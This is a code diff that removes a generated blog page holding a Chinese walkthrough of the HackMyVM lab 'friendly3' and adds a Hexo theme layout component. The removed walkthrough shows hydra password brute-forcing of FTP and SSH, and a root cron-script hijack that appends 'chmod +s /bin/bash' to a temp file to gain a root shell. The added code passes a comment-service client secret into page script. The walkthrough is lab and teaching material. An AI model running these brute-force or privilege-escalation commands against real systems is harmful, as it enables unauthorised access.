@@ -1,308 +1,161 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <meta charset="utf-8">
-  
-  
-  <title>friendly3 | hackboy</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="1.扫描端口 1234567891011121314151617┌──(root㉿kali)-[&#x2F;home&#x2F;ace]└─# nmap -sC -sV -p- 192.168.56.140Starting Nmap 7.94 ( https:&#x2F;&#x2F;nmap.org ) at 2023-08-10 18:23 CSTNmap scan report for 192.168.56.140Host is u">
-<meta property="og:type" content="article">
-<meta property="og:title" content="friendly3">
-<meta property="og:url" content="http://example.com/2023/08/10/friendly3/index.html">
-<meta property="og:site_name" content="hackboy">
-<meta property="og:description" content="1.扫描端口 1234567891011121314151617┌──(root㉿kali)-[&#x2F;home&#x2F;ace]└─# nmap -sC -sV -p- 192.168.56.140Starting Nmap 7.94 ( https:&#x2F;&#x2F;nmap.org ) at 2023-08-10 18:23 CSTNmap scan report for 192.168.56.140Host is u">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/pic/image-20230810182607711.png">
-<meta property="og:image" content="http://example.com/pic/image-20230810183628636.png">
-<meta property="article:published_time" content="2023-08-10T09:34:33.000Z">
-<meta property="article:modified_time" content="2023-08-10T11:20:39.778Z">
-<meta property="article:author" content="honkerZ">
-<meta property="article:tag" content="hackmyvm">
-<meta property="article:tag" content="pspy">
-<meta property="article:tag" content="爆破">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/pic/image-20230810182607711.png">
-  
-    <link rel="alternate" href="/atom.xml" title="hackboy" type="application/atom+xml">
-  
-  
-    <link rel="shortcut icon" href="/favicon.png">
-  
-  
-    
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+const { Component } = require('inferno');
+const classname = require('hexo-component-inferno/lib/util/classname');
+const Head = require('./common/head');
+const Navbar = require('./common/navbar');
+const Widgets = require('./common/widgets');
+const Footer = require('./common/footer');
+const Scripts = require('./common/scripts');
+const Search = require('./common/search');
 
-  
-  
-<link rel="stylesheet" href="/css/style.css">
+module.exports = class extends Component {
+    render() {
+        const { site, config, page, helper, body } = this.props;
+        const { comment, use_pjax, has_banner } = config;
+        const { __, my_cdn, url_for } = helper;
 
-  
-    
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+        // 默认不加载公式，文中头部开启mathJax:true才加载
+        var isMath = page.mathJax != undefined && page.mathJax;
+        const language = page.lang || page.language || config.language;
+        const columnCount = Widgets.getColumnCount(config.widgets);
+        const hasComment = comment != undefined && comment.type != undefined && (comment.type == 'gitalk' || comment.type == 'valine')
+            && (comment.has_hot_recommend || comment.has_latest_comment);
+        var appKey;
+        var appId;
+        var userName;
+        var userRepo;
+        var isValine;
 
-  
-  
-<meta name="generator" content="Hexo 6.3.0"></head>
+        if (comment != undefined && comment.type != undefined && comment.type == 'gitalk') {
+            appId = comment.client_id;
+            appKey = comment.client_secret;
+            userName = comment.owner;;
+            userRepo = comment.repo;
+            isValine = false;
+        } else if (comment != undefined && comment.type != undefined && comment.type == 'valine') {
+            appId = comment.app_id;
+            appKey = comment.app_key;
+            userName = comment.owner;
+            isValine = true;
+        }
+        var hotTitle = __('widget.hot_recommend');
+        var hotTip = __('widget.hot_recommend_tip');
 
-<body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">hackboy</a>
-      </h1>
-      
-        <h2 id="subtitle-wrap">
-          <a href="/" id="subtitle">hacking...</a>
-        </h2>
-      
-    </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        // =====index hot_recommend
+        var hotRecommendStr =
+            `<div class="card widget">
+            <div class="card-content">
+                <h3 class="menu-label">${hotTitle}</h3><span id="index_hot_div">${hotTip}</span>
+            </div>
+        </div>`;
+
+        // =====index banner
+        var bannerStr =
+            `<div class="card widget">
+            <div class="card-content1 card-image">
+                <span id="banner"><div class="card-content ">Banner ${hotTip}</div></span>
+            </div>
+        </div>`;
         
-          <a class="main-nav-link" href="/">Home</a>
+        // mathjax support 使用方法 md文章头部开启mathJax: true，md文章中公式格式：$$f(x) = a_1x^n + a_2x^{n-1} + a_3x^{n-2}$$
+        var mathJaxJs = `function loadMathJax() { //加载mathjax
+            $.getScript("//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML", function () {
+                MathJax.Hub.Config({ tex2jax: { inlineMath: [['$', '$'], ['\\(', '\\)']] } });
+                var math = document.getElementsByClassName("entry-content")[0];
+                MathJax.Hub.Queue(["Typeset", MathJax.Hub, math]);
+            });
+        };loadMathJax();`;
+
+        var pjaxJs = `var pjax = new Pjax({
+            elements: "a",//代表点击链接就更新
+            selectors: [  //代表要更新的节点
+                ".section",
+                "title"
+            ],
+            cache: true,
+            cacheBust:false
+        })
+
+        function loadBusuanzi(){
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js", function () {});
+        }
+
+        function loadMathJax() { //加载mathjax
+            $.getScript("//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML", function () {
+                MathJax.Hub.Config({ tex2jax: { inlineMath: [['$', '$'], ['\\(', '\\)']] } });
+                var math = document.getElementsByClassName("entry-content")[0];
+                MathJax.Hub.Queue(["Typeset", MathJax.Hub, math]);
+            });
+        };
+
+        // 开始 PJAX 执行的函数
+        document.addEventListener('pjax:send', function () {
+        });
         
-          <a class="main-nav-link" href="/archives">Archives</a>
-        
-      </nav>
-      <nav id="sub-nav">
-        
-        
-          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
-        
-        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
-      </div>
-    </div>
-  </div>
-</header>
+        // PJAX 完成之后执行的函数，可以和上面的重载放在一起
+        document.addEventListener('pjax:complete', function () {
+            $(".section").css({opacity:1});
+            if(${hasComment}){
+                $.getScript('${my_cdn(url_for('/js/comment-issue-data.js'))}',function(){loadIssueData('${appId}','${appKey}','${userName}','${userRepo}',${isValine});});
+            }
+            if(${isMath}){
+                loadMathJax();
+            }
+            loadMainJs(jQuery, window.moment, window.ClipboardJS, window.IcarusThemeSettings);
+            loadBackTop();
+            loadBusuanzi();
+            if(typeof loadBanner == 'function'){
+                loadBanner();
+            }
+        });`;
 
-      <div class="outer">
-        <section id="main"><article id="post-friendly3" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2023/08/10/friendly3/" class="article-date">
-  <time class="dt-published" datetime="2023-08-10T09:34:33.000Z" itemprop="datePublished">2023-08-10</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/">渗透学习</a>
-  </div>
+        if (comment == undefined || comment.type == undefined
+            || comment.type != 'gitalk'
+            || comment.has_hot_recommend == undefined
+            || !comment.has_hot_recommend) {
+            hotRecommendStr = '';
+        }
 
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="p-name article-title" itemprop="headline name">
-      friendly3
-    </h1>
-  
+        var indexTopData = hotRecommendStr;
 
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>1.扫描端口</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># nmap -sC -sV -p- 192.168.56.140</span></span><br><span class="line">Starting Nmap <span class="number">7.94</span> ( https://nmap.org ) at <span class="number">2023</span><span class="literal">-08-10</span> <span class="number">18</span>:<span class="number">23</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">56.140</span></span><br><span class="line">Host is up (<span class="number">0.00074</span>s latency).</span><br><span class="line">Not shown: <span class="number">65532</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">21</span>/tcp open  ftp     vsftpd <span class="number">3.0</span>.<span class="number">3</span></span><br><span class="line"><span class="number">22</span>/tcp open  ssh     OpenSSH <span class="number">9.2</span>p1 Debian <span class="number">2</span> (protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh<span class="literal">-hostkey</span>: </span><br><span class="line">|   <span class="number">256</span> bc:<span class="number">46</span>:<span class="number">3</span>d:<span class="number">85</span>:<span class="number">18</span>:bf:c7:bb:<span class="number">14</span>:<span class="number">26</span>:<span class="number">9</span>a:<span class="number">20</span>:<span class="number">6</span>c:d3:<span class="number">39</span>:<span class="number">52</span> (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">7</span>b:<span class="number">13</span>:<span class="number">5</span>a:<span class="number">46</span>:a5:<span class="number">62</span>:<span class="number">33</span>:<span class="number">09</span>:<span class="number">24</span>:<span class="number">9</span>d:<span class="number">3</span>e:<span class="number">67</span>:b6:eb:<span class="number">3</span>f:a1 (ED25519)</span><br><span class="line"><span class="number">80</span>/tcp open  http    nginx <span class="number">1.22</span>.<span class="number">1</span></span><br><span class="line">|_http<span class="literal">-server-header</span>: nginx/<span class="number">1.22</span>.<span class="number">1</span></span><br><span class="line">|_http<span class="literal">-title</span>: Welcome to nginx!</span><br><span class="line">MAC Address: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:<span class="number">2</span>D:A5:<span class="number">44</span> (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+        const hasBanner = has_banner != undefined && has_banner;
 
-<p>2.访问页面</p>
-<p><img src="/../pic/image-20230810182607711.png" alt="image-20230810182607711"></p>
-<p>由此，存在两个账户</p>
-<p>sysadmin和juan</p>
-<p>试一试爆破</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># hydra -l juan -P /usr/share/wordlists/rockyou.txt ftp://192.168.56.140</span></span><br><span class="line">Hydra v9.<span class="number">4</span> (c) <span class="number">2022</span> by van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes (this is non<span class="literal">-binding</span>, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser<span class="literal">-thc</span>/thc<span class="literal">-hydra</span>) starting at <span class="number">2023</span><span class="literal">-08-10</span> <span class="number">18</span>:<span class="number">28</span>:<span class="number">23</span></span><br><span class="line">[<span class="type">DATA</span>] max <span class="number">16</span> tasks per <span class="number">1</span> server, overall <span class="number">16</span> tasks, <span class="number">14344399</span> login tries (l:<span class="number">1</span>/p:<span class="number">14344399</span>), ~<span class="number">896525</span> tries per task</span><br><span class="line">[<span class="type">DATA</span>] attacking ftp://<span class="number">192.168</span>.<span class="number">56.140</span>:<span class="number">21</span>/</span><br><span class="line">[<span class="number">21</span>][<span class="type">ftp</span>] host: <span class="number">192.168</span>.<span class="number">56.140</span>   login: juan   password: alexis</span><br><span class="line"><span class="number">1</span> of <span class="number">1</span> target successfully completed, <span class="number">1</span> valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser<span class="literal">-thc</span>/thc<span class="literal">-hydra</span>) finished at <span class="number">2023</span><span class="literal">-08-10</span> <span class="number">18</span>:<span class="number">28</span>:<span class="number">50</span></span><br></pre></td></tr></table></figure>
+        if (indexTopData == '' && hasBanner) {
+            indexTopData = bannerStr;
+        }
 
-<p>进入ftp看看</p>
-<p><img src="/../pic/image-20230810183628636.png" alt="image-20230810183628636"></p>
-<p>3.进入系统</p>
-<p>ftp鸟用没有。。。</p>
-<p>进入ssh 爆破</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># hydra -l juan  -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.140</span></span><br><span class="line">Hydra v9.<span class="number">4</span> (c) <span class="number">2022</span> by van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes (this is non<span class="literal">-binding</span>, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser<span class="literal">-thc</span>/thc<span class="literal">-hydra</span>) starting at <span class="number">2023</span><span class="literal">-08-10</span> <span class="number">18</span>:<span class="number">37</span>:<span class="number">52</span></span><br><span class="line">[<span class="type">WARNING</span>] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use <span class="literal">-t</span> <span class="number">4</span></span><br><span class="line"><span class="function">[<span class="type">WARNING</span>] <span class="title">Restorefile</span></span> (you have <span class="number">10</span> seconds to abort... (use option <span class="literal">-I</span> to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore</span><br><span class="line">[<span class="type">DATA</span>] max <span class="number">16</span> tasks per <span class="number">1</span> server, overall <span class="number">16</span> tasks, <span class="number">14344399</span> login tries (l:<span class="number">1</span>/p:<span class="number">14344399</span>), ~<span class="number">896525</span> tries per task</span><br><span class="line">[<span class="type">DATA</span>] attacking ssh://<span class="number">192.168</span>.<span class="number">56.140</span>:<span class="number">22</span>/</span><br><span class="line">[<span class="number">22</span>][<span class="type">ssh</span>] host: <span class="number">192.168</span>.<span class="number">56.140</span>   login: juan   password: alexis</span><br><span class="line"><span class="number">1</span> of <span class="number">1</span> target successfully completed, <span class="number">1</span> valid password found</span><br><span class="line">[<span class="type">WARNING</span>] Writing restore file because <span class="number">2</span> final worker threads did not complete <span class="keyword">until</span> <span class="keyword">end</span>.</span><br><span class="line">[<span class="type">ERROR</span>] <span class="number">2</span> targets did not resolve or could not be connected</span><br><span class="line">[<span class="type">ERROR</span>] <span class="number">0</span> target did not complete</span><br><span class="line">Hydra (https://github.com/vanhauser<span class="literal">-thc</span>/thc<span class="literal">-hydra</span>) finished at <span class="number">2023</span><span class="literal">-08-10</span> <span class="number">18</span>:<span class="number">39</span>:<span class="number">01</span></span><br></pre></td></tr></table></figure>
+        if (page.path != 'index.html') {
+            indexTopData = '';
+        }
 
-<p>ssh连接一下</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># ssh juan@192.168.56.140</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.56.140 (192.168.56.140)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:qcoxC68+orQ8LIJrunR2ElUTnj9X5X0OFj9F/oxHDjc.</span></span><br><span class="line"><span class="string">This key is not known by any other names.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span><span class="number">192.168</span>.<span class="number">56.140</span><span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">juan@192.168.56.140&#x27;</span>s password: </span><br><span class="line">Linux friendly3 <span class="number">6.1</span>.<span class="number">0</span><span class="literal">-9-amd64</span> <span class="comment">#1 SMP PREEMPT_DYNAMIC Debian 6.1.27-1 (2023-05-08) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Thu Aug <span class="number">10</span> <span class="number">06</span>:<span class="number">42</span>:<span class="number">48</span> <span class="number">2023</span></span><br><span class="line">juan@friendly3:~<span class="variable">$</span> <span class="built_in">ls</span></span><br><span class="line">ftp  user.txt</span><br><span class="line">juan@friendly3:~<span class="variable">$</span> <span class="built_in">cat</span> user.txt</span><br><span class="line">cb40b159c8086733d57280de3f97de30</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>success!!!</p>
-<p>4.sudo提权</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">juan@friendly3:~<span class="variable">$</span> sudo <span class="literal">-l</span></span><br><span class="line"><span class="literal">-bash</span>: sudo: command not found</span><br><span class="line">juan@friendly3:~<span class="variable">$</span> </span><br></pre></td></tr></table></figure>
-
-<p>无法使用？</p>
-<p>看看系统的调用吧</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2023</span>/<span class="number">08</span>/<span class="number">10</span> <span class="number">06</span>:<span class="number">56</span>:<span class="number">01</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">1591</span>   | /usr/sbin/CRON <span class="operator">-f</span> </span><br><span class="line"><span class="number">2023</span>/<span class="number">08</span>/<span class="number">10</span> <span class="number">06</span>:<span class="number">56</span>:<span class="number">01</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">1592</span>   | /bin/sh <span class="literal">-c</span> /opt/check_for_install.sh </span><br><span class="line"><span class="number">2023</span>/<span class="number">08</span>/<span class="number">10</span> <span class="number">06</span>:<span class="number">56</span>:<span class="number">01</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">1593</span>   | /bin/bash /opt/check_for_install.sh </span><br><span class="line"><span class="number">2023</span>/<span class="number">08</span>/<span class="number">10</span> <span class="number">06</span>:<span class="number">56</span>:<span class="number">01</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">1594</span>   | /bin/bash /opt/check_for_install.sh </span><br><span class="line"><span class="number">2023</span>/<span class="number">08</span>/<span class="number">10</span> <span class="number">06</span>:<span class="number">56</span>:<span class="number">01</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">1595</span>   | chmod +<span class="built_in">r</span> /tmp/a.bash </span><br><span class="line"><span class="number">2023</span>/<span class="number">08</span>/<span class="number">10</span> <span class="number">06</span>:<span class="number">56</span>:<span class="number">01</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">1596</span>   | /bin/bash /opt/check_for_install.sh </span><br><span class="line"><span class="number">2023</span>/<span class="number">08</span>/<span class="number">10</span> <span class="number">06</span>:<span class="number">56</span>:<span class="number">01</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">1597</span>   | /bin/bash /opt/check_for_install.sh </span><br><span class="line"><span class="number">2023</span>/<span class="number">08</span>/<span class="number">10</span> <span class="number">06</span>:<span class="number">56</span>:<span class="number">01</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">1598</span>   | /bin/bash /opt/check_for_install.sh </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>有两个脚本，看看能不能劫取</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">juan@friendly3:~<span class="variable">$</span> <span class="built_in">cat</span> /opt/check_for_install.sh </span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/usr/bin/<span class="built_in">curl</span> <span class="string">&quot;http://127.0.0.1/9842734723948024.bash&quot;</span> &gt; /tmp/a.bash</span><br><span class="line"></span><br><span class="line">chmod +x /tmp/a.bash</span><br><span class="line">chmod +<span class="built_in">r</span> /tmp/a.bash</span><br><span class="line">chmod +w /tmp/a.bash</span><br><span class="line"></span><br><span class="line">/bin/bash /tmp/a.bash</span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> <span class="literal">-rf</span> /tmp/a.bash</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>呦吼！！！！</p>
-<p>a.bash可以试试劫取</p>
-<p>分析脚本，我们可以看到它对同一个 Web 服务器执行一个卷曲到一个名为下载它并保存该文件的文件 <code>9842734723948024.bash</code> ，然后 <code>/tmp/a.bash</code> 它继续授予它所有权限，直到它执行并删除它。</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bash<span class="literal">-5</span>.<span class="number">2</span><span class="comment"># cat a.sh</span></span><br><span class="line"><span class="keyword">while</span> true :</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;chmod +s /bin/bash&quot;</span> &gt;&gt;/tmp/a.bash</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
-
-<p>等一会儿</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">juan@friendly3:~<span class="variable">$</span> bash <span class="literal">-p</span></span><br><span class="line">bash<span class="literal">-5</span>.<span class="number">2</span><span class="comment"># ls</span></span><br><span class="line">a.sh  ftp  pspy64  user.txt</span><br><span class="line">bash<span class="literal">-5</span>.<span class="number">2</span><span class="comment"># cat /root/root.txt</span></span><br><span class="line">eb9748b67f25e6bd202e5fa25f534d51</span><br></pre></td></tr></table></figure>
-
-<p>over!</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/08/10/friendly3/" data-id="clmnr8k0g000vso8ggucn7tyn" data-title="friendly3" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hackmyvm/" rel="tag">hackmyvm</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pspy/" rel="tag">pspy</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%88%86%E7%A0%B4/" rel="tag">爆破</a></li></ul>
-
-    </footer>
-  </div>
-  
-    
-<nav id="article-nav">
-  
-    <a href="/2023/08/11/gift/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          gift
-        
-      </div>
-    </a>
-  
-  
-    <a href="/2023/08/08/githappens/" id="article-nav-older" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">githappens</div>
-    </a>
-  
-</nav>
-
-  
-</article>
-
-
-</section>
-        
-          <aside id="sidebar">
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Categories</h3>
-    <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/hack-the-box/">hack the box</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/home/">home</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux%E5%AD%A6%E4%B9%A0/">linux学习</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/">渗透学习</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tags</h3>
-    <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/burp-suite/" rel="tag">burp suite</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/chown/" rel="tag">chown</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/find/" rel="tag">find</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ftp/" rel="tag">ftp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/gittools/" rel="tag">gittools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hackmyvm/" rel="tag">hackmyvm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/home/" rel="tag">home</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hydra/" rel="tag">hydra</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux%E6%8F%90%E6%9D%83/" rel="tag">linux提权</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/msf/" rel="tag">msf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/msfs/" rel="tag">msfs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nmap/" rel="tag">nmap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pspy/" rel="tag">pspy</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shellinabox/" rel="tag">shellinabox</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssh/" rel="tag">ssh</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/talnet/" rel="tag">talnet</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tryhackme/" rel="tag">tryhackme</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/webshell/" rel="tag">webshell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%88%86%E7%A0%B4/" rel="tag">爆破</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%9B%AE%E5%BD%95%E6%B8%97%E9%80%8F/" rel="tag">目录渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/" rel="tag">目录遍历</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%B7%AF%E5%BE%84%E5%8A%AB%E6%8C%81/" rel="tag">路径劫持</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tag Cloud</h3>
-    <div class="widget tagcloud">
